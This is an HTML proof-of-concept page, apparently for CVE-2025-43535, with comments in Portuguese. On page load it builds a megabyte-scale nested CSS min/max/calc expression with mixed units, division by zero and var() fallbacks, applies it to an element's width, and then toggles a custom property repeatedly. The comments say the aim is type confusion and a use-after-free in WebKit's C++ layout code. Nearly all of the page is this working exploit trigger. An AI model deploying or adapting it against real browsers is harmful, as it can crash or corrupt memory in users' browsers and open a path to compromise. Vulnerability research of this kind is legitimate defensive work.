<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>CVE-2025-43535 PoC — Poisoned Math</title>
<style>
  body { background:#0a0a0a; color:#88ff88; font-family:monospace; padding:16px; }
  #log { background:#111; border:1px solid #88ff88; padding:12px;
         height:320px; overflow-y:auto; font-size:12px; }
  .ok{color:#00ff88} .fail{color:#ff4444} .info{color:#ffbb00} .crash{color:#ff00ff;font-weight:bold}
</style>
</head>
<body>
<h3>CVE-2025-43535 — Memory Corruption (Poisoned AST)</h3>
<div id="log"></div>

<script>
"use strict";

const L=(m,c)=>{const d=document.getElementById('log');
  d.innerHTML+=`<div class="${c||'info'}">[${Date.now()%100000}] ${m}</div>`;
  d.scrollTop=d.scrollHeight;
};

const yieldGC = () => new Promise(r => setTimeout(r, 200));

async function variant1_poisoned_math() {
  L("[V1] Iniciando gerador matemático venenoso (Type Confusion)...");

  const el = document.createElement('div');
  el.style.cssText = 'position:absolute;top:-9999px';
  document.body.appendChild(el);

  let mathCache = {};

  // Função que gera complexidade e conflito de tipos, não apenas tamanho
  function makePoisonedMath(depth) {
    if (depth <= 0) {
      // Injetando unidades diferentes e var() com fallback obscuro
      const bases = ['1px', '1vw', 'calc(1px/0)', 'var(--x, 1em)'];
      return bases[Math.floor(Math.random() * bases.length)];
    }
    
    if (mathCache[depth]) return mathCache[depth];

    const f = depth % 2 === 0 ? 'min' : 'max';
    
    // A cada 5 níveis, injetamos uma operação matemática ilegal ou complexa 
    // para forçar o WebKit a descartar e recalcular nós (gerando churn no C++)
    let result = '';
    if (depth % 5 === 0) {
       result = `calc(${f}(${makePoisonedMath(depth-1)}, ${makePoisonedMath(depth-1)}) + 1%)`;
    } else {
       result = `${f}(${makePoisonedMath(depth-1)}, ${makePoisonedMath(depth-1)})`;
    }
    
    mathCache[depth] = result;
    return result;
  }

  // Nível 24 é seguro e nunca vai dar RangeError de string
  const nivelSeguro = 24;

  L(`[V1] Gerando payload com Nível ${nivelSeguro}...`);
  try {
    let payload = makePoisonedMath(nivelSeguro);
    L(`[V1] Payload gerado. Tamanho: ${(payload.length / 1024 / 1024).toFixed(2)} MB`);
    
    // Configura a variável CSS usada como fallback na base
    el.style.setProperty('--x', '0px');
    
    L(`[V1] Aplicando no DOM e forçando cálculo de tipos...`);
    el.style.width = payload;
    
    // Libera a string gigante do JS
    payload = null;
    mathCache = null;
    await yieldGC();

    // O C++ vai tentar resolver a divisão por zero, os % misturados com vw, 
    // tudo no meio de uma árvore de milhões de nós.
    void el.offsetWidth;
    
    L(`[V1] Sobreviveu ao primeiro impacto. Alternando variáveis para causar Use-After-Free...`);
    
    // Se o bug for de lifecycle, alterar a variável customizada vai forçar o 
    // C++ a reavaliar toda a árvore usando ponteiros que podem já ter sido liberados.
    for(let i = 0; i < 50; i++) {
        el.style.setProperty('--x', i % 2 === 0 ? '10px' : 'calc(1px / 0)');
        void el.offsetWidth;
    }

    L(`[V1] Teste finalizado limpo!`, "ok");
  } catch(e) {
    L(`[V1] Erro na execução: ${e}`, "fail");
  }

  document.body.removeChild(el);
}

async function main() {
  try {
    await variant1_poisoned_math();
    L("=== FIM DA EXECUÇÃO ===", "ok");
  } catch(e) {
    L("EXCEÇÃO FATAL: " + e.toString(), "fail");
  }
}

window.addEventListener('load', () => setTimeout(main, 500));
</script>
</body>
</html>
